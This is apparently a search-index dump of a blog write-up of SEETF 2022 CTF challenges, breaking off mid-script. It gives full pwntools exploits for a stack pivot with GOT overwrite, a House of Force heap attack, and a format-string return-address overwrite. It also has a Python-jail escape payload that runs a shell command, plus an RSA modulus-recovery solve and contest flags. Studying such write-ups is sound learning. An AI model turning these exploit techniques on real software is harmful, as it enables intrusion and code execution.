2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":" During the weekend, I played this CTF with one of my school’s friend. We managed to solve some problems, so we will try to write how we solved some of the challenge. Pwn We will explain our solution for some challenges that we solved in the pwn category. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:0:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Easy Overflow Author: Bob123 I did a check on my return address. Now you shouldn't be able to control my RIP. nc fun.chall.seetf.sg 50003 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file, Let’s try to disassemble it. main function undefined8 main(void) { char local_28 [32]; setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); puts(\"I will let you overflow me.\"); vuln(); puts(\"I will give you one more chance.\"); fgets(local_28,8,stdin); puts(local_28); return 0; } vuln function void vuln(void) { long in_stack_00000000; char local_28 [32]; gets(local_28); if (in_stack_00000000 == 0x401212) { puts(\"Good boi\\n\"); return; } puts(\"Naughty Boi\\n\"); /* WARNING: Subroutine does not return */ exit(-1); } win function void win(void) { system(\"cat flag\"); /* WARNING: Subroutine does not return */ exit(0); } Notice that on vuln method, there is a buffer overflow bug, because it used gets. However, there is a check where the return address must be 0x401212, which mean we aren’t allowed to modify the return address of the vuln method. And then after the vuln method, we were given one more chance to send our input, which will be stored in rbp-0x20. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan We can’t overwrite the return address, but we actually can overwrite the saved rbp, so that we can pivot the main function stack. The checksec result also indicate that we can do GOT overwrite. Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) So, our plan is to pivot the main stack (overwrite saved rbp) to GOT['puts']+0x20, so that when we send our second input, it will overwrite it with the win function. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is our full solver from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") elf = ELF('./easy_overflow') r = remote('fun.chall.seetf.sg', 50003) payload = b'a'*0x20+p64(elf.got['puts']+0x20)+p64(0x00000000401212) print(payload) r.sendlineafter(b'overflow me.\\n', payload) r.sendlineafter(b'more chance.\\n', p64(elf.symbols['win'])) r.interactive() Result Flag: SEE{R1P_15_K1NG_RBP_15_QU33N_31cfc2f963517cd7e1b33b84a0e6bea2} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:1:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"“as” “df” Author: TheMythologist Why use a python interpreter when there are online ones? nc fun.chall.seetf.sg 50002 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:2:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Let’s try to connect to the server, and turn out it is a python jail challenge. We tried to print(globals), and found out that there is the blacklist array Notes that, + and whitespace is banned. The trick to bypass this is, we can actually concat a string without using +. Example: 'as''df' will be concatted by python to 'asdf'. To bypass the whitespace, we use \\x20. And the full payload is below, where we use the help of getattr to import os. print(getattr(getattr(globals()['__builtins__'],'__im''port__')('o''s'),'sys''tem')('cat\\x20/fl*')) Result Flag: SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:2:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Hall Of Fame Author: @L0uisJ0shua It’s about drive, it’s about power, we stay hungry, we devour Put in the work, put in the hours and take what’s ours. Time to get to the Hall of Fame and be among the GOATS. nc fun.chall.seetf.sg 50004 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file and libc-2.27.so. Let’s try to disassemble the binary file. main int main(void) { int iVar1; char *pcVar2; size_t sVar3; long in_FS_OFFSET; int counter; int o; char *pty; void *heap_pointer; ulong size; char *ptr; char *chunk; char option [3]; char score [64]; char word [100]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); counter = 0; heap_pointer = sbrk(0); setup_IO(); while( true ) { while( true ) { do { print_statements(counter); printf(\"Choose\u003e \"); fflush(stdout); pcVar2 = fgets(option,3,stdin); } while (pcVar2 == (char *)0x0); fflush(stdin); sVar3 = strcspn(option,\"\\n\"); option[sVar3] = '\\0'; iVar1 = atoi(option); if (iVar1 != 2) break; printf(\"\\nThe position of latest addition is at %p\\n\",heap_pointer); printf(\"The position of PUTS is at %p\\n\",puts); } if (iVar1 == 3) break; if (iVar1 == 1) { printf(\"\\nHow many points did this person score? \u003e \"); fflush(stdout); pcVar2 = fgets(score,0x40,stdin); if (pcVar2 != (char *)0x0) { fflush(stdin); sVar3 = strcspn(score,\"\\n\"); score[sVar3] = '\\0'; size = strtol(score,\u0026pty,10); ptr = (char *)malloc(size); chunk = ptr; printf(\"\\nWho is this Hall of Famer \u003e \"); fflush(stdout); fgets(word,100,stdin); fflush(stdin); *(undefined8 *)chunk = word._0_8_; *(undefined8 *)(chunk + 8) = word._8_8_; *(undefined8 *)(chunk + 0x10) = word._16_8_; *(undefined8 *)(chunk + 0x18) = word._24_8_; *(undefined8 *)(chunk + 0x20) = word._32_8_; *(undefined8 *)(chunk + 0x28) = word._40_8_; *(undefined8 *)(chunk + 0x30) = word._48_8_; *(undefined8 *)(chunk + 0x38) = word._56_8_; *(undefined8 *)(chunk + 0x40) = word._64_8_; *(undefined8 *)(chunk + 0x48) = word._72_8_; *(undefined8 *)(chunk + 0x50) = word._80_8_; *(undefined8 *)(chunk + 0x58) = word._88_8_; *(undefined4 *)(chunk + 0x60) = word._96_4_; heap_pointer = ptr; counter = counter + 1; } } else { puts(\"No choice Given!\"); } } puts(\"Exiting software...\"); if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } print_statements int print_statements(int counter) { puts(\"Welcome to the Hall of Fame!\\n\"); printf(\"Number of Hall Of Famers: %d\\n\",(ulong)(uint)counter); puts(\"What brings you in here?\\n\"); puts(\"1) Add Hall of Famer\\n2) View Position\\n3) Exit\"); return 0; } So the binary will call print_statements first to print the menu, where we can add, view and exit. Let’s take a look on the main method one-by-one: do { print_statements(counter); printf(\"Choose\u003e \"); fflush(stdout); pcVar2 = fgets(option,3,stdin); } while (pcVar2 == (char *)0x0); fflush(stdin); sVar3 = strcspn(option,\"\\n\"); option[sVar3] = '\\0'; iVar1 = atoi(option); if (iVar1 != 2) break; printf(\"\\nThe position of latest addition is at %p\\n\",heap_pointer); printf(\"The position of PUTS is at %p\\n\",puts); Okay, so the second menu turn out gave us a leak of the PUTS libc address and the heap address. This help us a lot, as we don’t need to leak the libc address at all. Now, let’s check the first menu: if (iVar1 == 1) { printf(\"\\nHow many points did this person score? \u003e \"); fflush(stdout); pcVar2 = fgets(score,0x40,stdin); if (pcVar2 != (char *)0x0) { fflush(stdin); sVar3 = strcspn(score,\"\\n\"); score[sVar3] = '\\0'; size = strtol(score,\u0026pty,10); ptr = (char *)malloc(size); chunk = ptr; printf(\"\\nWho is this Hall of Famer \u003e \"); fflush(stdout); fgets(word,100,stdin); fflush(stdin); *(undefined8 *)chunk = word._0_8_; *(undefined8 *)(chunk + 8) = word._8_8_; *(undefined8 *)(chunk + 0x10) = word._16_8_; *(undefined8 *)(chunk + 0x18) = word._24_8_; *(undefined8 *)(chunk + 0x20) = word._32_8_; *(undefined8 *)(chunk + 0x28) = word._40_8_; *(undefined8 *)(chunk + 0x30) = word._48_8_; *(undefined8 *)(chunk + 0x38) = word._56_8_; *(undefined8 *)(chunk + 0x40) = word._64_8_; *(undefined8 *)(chunk + 0x48) = word._72_8_; *(undefined8 *)(chunk + 0x50) = word._80_8_; *(undefined8 *)(chunk + 0x58) = word._88_8_; *(undefined4 *)(chunk + 0x60) = word._96_4_; heap_pointer = ptr; counter = co","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan So far, what we have gathered: We know the heap address and the libc base address We can control the malloc size There is heap-overflow bug (with constraint that the malloc chunk size is less than 100) There isn’t free feature The libc file is glibc 2.27 We can use house of force attack to solve this challenge. House of force is an attack, which is done by overflowing the heap’s wildernerss/top_chunk’s size into a large number, so that we can forge the malloc chunk address to address that we want. Refering to the phrack article, it requires three conditions: One overflow in a chunk that allows to overwrite the Wilderness. A call to “malloc()” with size field defined by designer. Another call to “malloc()” where data can be handled by designer. To give some context, suppose that in the current heap, we have one chunk with size 0x20, usually the layout of heap is like below ... | prev_size chunk | |-----------------| \u003c- 0x8 byte | size chunk | |-----------------| \u003c- 0x8 byte | data | | | |-----------------| \u003c- 0x10 byte |prev_sz top_chunk| |-----------------| \u003c- 0x8 byte | size top_chunk | |-----------------| \u003c- 0x8 byte ... So, on the given binary, if we allocate a size (score) less than 100, and we can allocate 100 bytes, that means we can overwrite the top_chunk size, which mean we have fulfilled the first condition. And then, because we can call malloc as much as we can, and we can control the size, that means the second and third requirements are fulfilled also. To understand better the idea behind it, this attack want to abuse this LOC in the malloc.c implementation inside glibc 2.27 method _int_malloc. use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-\u003etop). Note that this is in accord with the best-fit search rule. In effect, av-\u003etop is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-\u003etop always exists (i.e., has size \u003e= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-\u003etop; size = chunksize (victim); if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u003etop = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } Reading through the source code of glibc malloc implementation, when we call malloc(size), it will try to check whether there is any entries in the heap bin first. If not, then it will try to use the top_chunk, which basically goes to the above code. And then, the reason why we overwrite the chunk size with a large value (E.g. -1, which is 0xFFFFFFFFFFFFFFFF) is to ensure that if we do malloc(large_size), it will be guaranteed that the malloc will goes to the above LOC (it fulfilled this condition if ((unsigned long) (size) \u003e= (unsigned long) (nb + MINSIZE))), so that it won’t call mmap via sysmalloc (You can read the full source code in here). Assume that we have overwite the top chunk size with 0xFFFFFFFFFFFFFFFF with the heap overflow that we found before. Let’s move to the logic inside the conditional block to understand why we can pivot the malloc chunk to our desired address. remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u003etop = remainder; What is nb? Diving through the source code, malloc-internal.h #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) malloc.c #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u003c MINSIZE) ? \\ MINSIZE : \\ ((req","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution In order to implement our plan, some key notes that we need to consider: Let say that we target to overwrite address 0x808080, then we need to pivot the top_chunk to 0x808080-0x10, because the first 0x10 space will be used to store the metadata. It’s okay to send negative value to the malloc size, as it will be converted to unsigned anyway. It’s better for us to just overwrite the whole GOT table (which mean our desired_address should be smaller than the GOT first entry address), so that we don’t overwrite the GOT function with the top_chunk metadata (which can caused segfault during execution). Notes that the one_gadget returned address has contstraint where the value of [rsp+0xXX] should be nil. This means that we might need to heuristically try one-by-one which GOT function fulfill the constraint, so that we can replace it with the one_gadget address. During the CTF: We pivot the top_chunk address to 0x602000, which is the start of GOT section. We found that replacing fgets with the one_gadget fulfill the constraint. So, we carefully overwrite the GOT function which located before fgets with the correct address. So, below is our full script to do that: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./hall_of_fame_patched\") libc = ELF(\"./libc-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r) else: r = remote(\"fun.chall.seetf.sg\", 50004) return r def add(r, score, name): r.sendlineafter(b'Choose\u003e ', b'1') r.sendlineafter(b'score? \u003e ', score) r.sendlineafter(b'Famer \u003e ', name) def view(r): r.sendlineafter(b'Choose\u003e ', b'2') r.recvuntil(b'is at ') heap_pointer = int(r.recvuntil(b'\\n').strip(), 16) r.recvuntil(b'is at ') leaked_puts = int(r.recvuntil(b'\\n').strip(), 16) return heap_pointer, leaked_puts r = conn() # Overwrite top_chunk size with 0xFFFFFFFFFFFFFFFF add(r, str(0x2).encode(), b'a'*0x10+p64(-1, signed=True)+p64(-1, signed=True)) # Get heap address and libc address heap_pointer, leaked_puts = view(r) log.info(f'Leaked heap: {hex(heap_pointer)}') log.info(f'Leaked puts: {hex(leaked_puts)}') # Calculate libc base address libc.address = leaked_puts - libc.symbols['puts'] log.info(f'Libc base: {hex(libc.address)}') # Calculate top chunk address top = heap_pointer+0x18 log.info(f'Top Chunk: {hex(top)}') # Calculate the correct malloc size, so that the top_chunk will point to 0x602000 num = 0x602000-top-0x8 log.info(f'Num: {num}') # Call malloc, and after the call, top_chunk will point to 0x602000 add(r, str(num).encode(), p64(libc.address+0x10a2fc)) ''' Carefully craft payload to overwrite the GOT table, so that only fgets got replaced with the one_gadget address Notes that 0x602000 will contain the chunk metadata, so when we next call malloc and fill its content, it will start from 0x602010. So keep in mind that our payload will start from 0x602010. From observation in GDB, below is the GOT table structure [0x602018] __stack_chk_fail@GLIBC_2.4 → 0x400716 [0x602020] printf@GLIBC_2.2.5 → 0x7ffff7a46e40 [0x602028] strcspn@GLIBC_2.2.5 → 0x400736 [0x602030] sbrk@GLIBC_2.2.5 → 0x7ffff7af8160 [0x602038] fgets@GLIBC_2.2.5 → 0x7ffff7a60ad0 ''' shell_addr = libc.address+0x10a2fc payload = p64(0) # Safe to be replaced by any bytes as it isn't the first GOT table entry address payload += p64(libc.symbols['__stack_chk_fail']) payload += p64(libc.symbols['printf']) payload += p64(libc.symbols['strcspn']) payload += p64(libc.symbols['sbrk']) payload += p64(shell_addr) # Overwrite fgets # Call malloc, and overwrite it add(r, str(10).encode(), payload) # We got our shell r.interactive() Result Flag: SEE{W3lc0mE_t0_th3_H4lL_0f_F4ME_0de280c6adb0f3da9f7ee5bd2057f8354969920c} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:3:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Pokemon Battle Author: Neobeo Gary wants to challenge you to a virtual battle. Be sure to choose your pokemon well! Here's an early leak of the game, but you should know that it's incomplete and there's currently no way to win. nc fun.chall.seetf.sg 50005 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file and the source code. Let’s check the source code // g++ pokemonbattle.cpp -w -o pokemonbattle #include \u003ciostream\u003e struct { char pokemon[13]; // longest pokemon name is 12 letters (Crabominable) virtual void Battle() { printf(\"Let the battle begin...\\n\"); // @todo: implement an actual battle printf(\"Your pokemon was defeated. You blacked out!\\n\"); } virtual void Play() { printf(\"Choose a pokemon: \"); std::cin.getline(pokemon, sizeof pokemon); printf(pokemon); printf(\", I choose you!\\n\"); Battle(); } } battler; int main() { battler.Play(); } void win() { system(\"cat flag.txt\"); } Okay, so there is win function which we could use. Also notice that there is a format string bug in the Play() method, but the payload length limit is very small, which is 12. I use GDB to have better understanding on how the binary works, and maybe found a way to send longer payload than 12, because 12 is not enough. So, first we try to set a breakpoint and inspect the GDB stack. I try to check the address inside 0x00555555558150, and below is the result Okay, so turn out, it is the battler object, which stored a pointer which point to the array of its internal method address pointer, and also the pokemon variable. After trying the format string payload several times, we found: %7$p will point to $rbp-8, which contains 0x00555555558150. If you are confused why the stack leak is in 7th parameter. Basically, in x64, if you call a function, the 6th first param will be passed via register (consecutively rdi, rsi, rdx, rcx, r8 r9), and the rest will be fetched from the stack. So, 1st is rsi, 2nd is rdx, 3rd is rcx, 4th is r8, 5th is r9, 6th is [rsp], and 7th is [rsp+8] or [rbp-8], which is the address that we got here. %8$p will point to $rbp, which contain saved rbp value of the previous call stack, which is null, so we can’t do much on this value. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan Based on info that we gather before, we know that we can get the value inside 0x00555555558150, which contains 0x0000555555557d68, pointer to the Battle() method. What if we increase the last byte by 8 by overwriting the last byte to 0x70 with payload %112c%7$hhn? If you don’t understand the payload, it means “overwrite the last byte of the value pointed by the 7-th param (which is the battler pointer to its array of pointers of the internal methods), with the total characters those have been printed (which is 112, %112c means print 112 whitespace)”. That means, when the battler struct want to call Battle(), instead of calling Battle(), it will call the address that was pointed by 0x0000555555557d68+8, which is the Play() method. With this, the Play() method will recursively call the method itself, and basically, we have infinite loop and we can split our format string payload to multiple step. Let’s try to do that, and inspect in the GDB on what the result is. As you can see, our stack got shifted by 0x20, and as you can see, the rbp value points to the previous call stack rbp, which is not null anymore, and it contains our stack address. To recap, now our call stack is main -\u003e Play() -\u003e Play(). Another thing is, if during the second call of Play() we input the format string: %8$p, it refers to the second call rbp address, which contains value of the first call rbp. %12$p, it refers to the first call rbp address, which is null. Now, imagine that we continue the binary again, now our call stack will be main -\u003e Play() -\u003e Play() -\u003e Play(), which mean if we input: %8$p, it refers to the third call rbp address, which contains value of the second call rbp. %12$p, it refers to the second call rbp address, which contains value of the first call rbp, which is not nil. So, after the third call, we now have a stack address (A) which contains pointer to a stack address (B), where B contains a stack address ( C ). Not only that, we also have a pointer that points to (B). With the format string bug, we can overwrite the value of B to point to our desired stack address (D). And after that, when we go to the fourth call, we can get what B points to (D), and with the format string bug, overwrite the value of (D) to our desired value. To give illustration, see below: On the third call, we can use format string, to get the 3rd-RBP value (which is 2nd-RBP), and overwrite what its point (which currently contains 1st-RBP, but soon will be overwritten to target) Third call stack Before Overwrite After Overwrite 2nd-RBP via Format String 3rd-RBP | 2nd-RBP | | 2nd-RBP | target | xxxxxxxx | | xxxxxxxx | | ... | -\u003e | ... | | ... | | ... | 2nd-RBP | 1st-RBP | | target | \u003c- Now it points to target instead of 1st-RBP ------------------------------------------------------ On the fourth call, we can use format string, to get the 2nd-RBP value (which is now target), and overwrite what its point (which currently contains xxxxxxxx, but soon will be overwritten to xxxxxxxy). Fourth call stack Before Overwrite After Overwrite target via Format String 4th-RBP | 3rd-RBP | | 3rd-RBP | | ... | | ... | | ... | | ... | | ... | | ... | 3rd-RBP | 2nd-RBP | | 2nd-RBP | target | xxxxxxxx | | xxxxxxxy | | ... | -\u003e | ... | | ... | | ... | 2nd-RBP | 1st-RBP | | target | Based on the above illustration, our plan is: On the first call, we will overwrite the battler struct value which contains the address that points to the array of the internal method pointers. We will shift it by 8 (overwrite the last byte from 0x68 to 0x70). After this, when battler call Battle(), it will call Play() instead, which resulted in infinite recursive of Play() calls. On the second call, we will leak the rbp address of the first call via %8$p. On the third call, we will overwrite the second rbp value to leak-0x20-0x20-0x20+8, which is the calculated address of the return address of the fourth call. On the fourth call, we will get the second rbp value (which now points to the four","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Notes that to implement our plan, we need to make sure that the last byte of the first leaked rbp is larger than 0x60, so that the second lsb won’t changed after we subtract it with 0x60. So, what we do is just re-connect to the server until the leaked rbp is \u003e 0x60. Below is our full script to implement the plan from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") while True: r = remote('fun.chall.seetf.sg', 50005) r.sendlineafter(b'pokemon: ', b'%112c%7$hhn') # Overwrite battler stored pointer, so that Battle() will be redirected to Play() r.sendlineafter(b'pokemon: ', b'%8$p') # Leak the stack address (precisely, the first RBP address) out = r.recvuntil(b'\\n') leak = int(out.split(b',')[0][-2:], 16) if leak \u003e 0x60: break target = leak-0x20-0x20-0x20+8 # Our target is the (future) fourth RBP + 8 (fourth call saved return address) payload = f'%{target}c%8$hhn'.encode() # Third call, we overwrite the 2nd-RBP value from first RBP to (future) fourth RBP + 8 r.sendlineafter(b'pokemon: ', payload) payload = f'%{0xc6}c%16$hhn'.encode() # Fourth call, we get the 2nd-RBP (which is now points to fourth saved return address), and overwrite its last byte, so that it points to win() r.sendlineafter(b'pokemon: ', payload) payload = b'%104c%7$hhn' # Fifth call, fix the battler stored pointer, so that Battle() will call the real Battle() r.sendlineafter(b'pokemon: ', payload) flag = r.recvuntil(b'\\n') # The fifth call will continue to fourth call, and the fourth call will return to win() instead to the third call print(f'Flag: {flag.decode()}') Result Flag: SEE{did_you_choose_missingno_b6d3c6594dcc332c7e22d231d10b8b8b} Crypto We managed to solve two challs on this category ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:4:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Lost Modulus Author: coff33 I've hidden my flag as a modulus, I'm sure no one will be able to retrieve it. nc fun.chall.seetf.sg 30004 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given one file which is the code of the running server. from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long with open(\"flag.txt\", \"rb\") as f: FLAG = f.read() n = bytes_to_long(FLAG) #make sure i have a big modulus while n.bit_length() \u003c 2048: n *= n def encrypt(m1, m2): e = getPrime(256) assert m1.bit_length() \u003e= 1600 and long_to_bytes(m1).startswith(b\"SEE{\"), 'first message must be at least 1600 bits and begin with \"SEE{\"' assert 500 \u003c= m2.bit_length() \u003c= 600, 'second message must be within 500 to 600 bits' return pow(m1, e, n), pow(m2, e, n) def main(): try: m1 = int(input(\"Message 1 (as integer) : \").strip()) m2 = int(input(\"Message 2 (as integer) : \").strip()) c1, c2 = encrypt(m1, m2) print(f\"\\nCiphers: \\n{[c1,c2]}\") except Exception as e: print(e) if __name__ == '__main__': main() So, reading through the code, the goal is we need to retrieve $N$, where $N$ is the flag. And then the server will gave us chance to encrypt two message. $e$ is a 256-prime. There is constraint, where: First message bits \u003e= 1600, and must start with SEE{ Second message bits range is 500-600 bits inclusive The server will return both of the encryption result. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Exploitation Plan We don’t know $e$ and $N$ value, and our task is to retrieve $N$. Suppose that we have message $m$, and $m_1=m^3$, $m_2=m$. Consider this equations. $$ \\begin{align} \\tag{1} c_1 \u0026\\equiv m_1^{e} \\mod N \\\\ c_1 \u0026\\equiv (m^3)^{e} \\mod N \\\\ c_1 \u0026= m^{3e} + k_1N \\\\ \\end{align} $$ where $k_1$ is unknown constant. Now, check out this equation. $$ \\begin{align*} c_2 \u0026\\equiv m_2^{e} \\mod N \\\\ c_2 \u0026\\equiv m^{e} \\mod N \\\\ c_2 \u0026= m^{e} + k_2N \\\\ \\end{align*} $$ Notice that if we cubed the $c_2$, $$ \\begin{align} \\tag{2} (c_2)^3 \u0026\\equiv (m^{e})^3 \\mod N \\\\ (c_2)^3 \u0026\\equiv m^{3e} \\mod N \\\\ (c_2)^3 \u0026= m^{3e} + k_2N \\\\ \\end{align} $$ we will get another equation, where $k_2$ is unknown constant. Notice that we can eliminate first and second equation to finally get the final equation $$ \\begin{align} \\tag{3} (c_2)^3-c_1 = k_3N \\end{align} $$ where $k3$ is unknown constant ($k2-k1$). Notes that, we can connect to the server multiple times, and the $N$ will remain constant as it is the flag. So, we can retrieve multiple value of $kN$, and then we can simply $\\gcd$ them to retrieve $N$, as their greatest shared common factor will be $N$. Bypassing the constraint Remember that we have constraints where the $m_1$ need to start with SEE{ and has \u003e= 1600 bits and $m_2$ bits need to be inclusively in range 500-600 bits. The trick is: We can generate any string start with SEE{ and the bit length is ~1650-1655 bits. Cube root it and ceil it. Use this as the $m_2$ value. It should be around ~555 bits, which fulfilled our constraint. And then we can simply cubed it again, so that we can get a value, which is cubed and start with SEE{. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is the script (sage) that we used to solve the chall. Notes that after retrieving the $N$, we need to recursively square root the value until the flag is shown, because the server is multiplying the $N$ with itself until the bit length is \u003e= 2048 bits. Base is the floating number of string SEE{\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00. What we do is trying to retrieve 3 values of $kN$ from the server, where the base got increased by 100 everytime we connect to the server (You can actually choose any number as long as the resulted string still start with SEE{). context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ciphers = [] base = 1.042136251760143366506601807791988359319192691917171290357448975749297374332472918910336805121784438281032305192209641733246059254524343284842603532996893119630072194458573013182932211946066537154955757274996373792440408972772708612077293733088200523229587153426763869162843302917457460893081839309369693718313098014501280069768531917574936731772140218047013318220556767781460996826455691622726550851494076382147744402895756978565209185302235414692929592677548505590430613815557144449326412657065984e498 for i in range(3): x = base+i*100 m2 = ceil(x.nth_root(3)) m1 = m2^3 r = remote('fun.chall.seetf.sg', 30004) r.sendlineafter(b'(as integer) : ', str(m1).encode()) r.sendlineafter(b'(as integer) : ', str(m2).encode()) r.recvuntil(b'Ciphers: ') out = eval(r.recvuntil(b']')) ciphers.append(out) x1 = ciphers[0][1]^3 - ciphers[0][0] x2 = ciphers[1][1]^3 - ciphers[1][0] x3 = 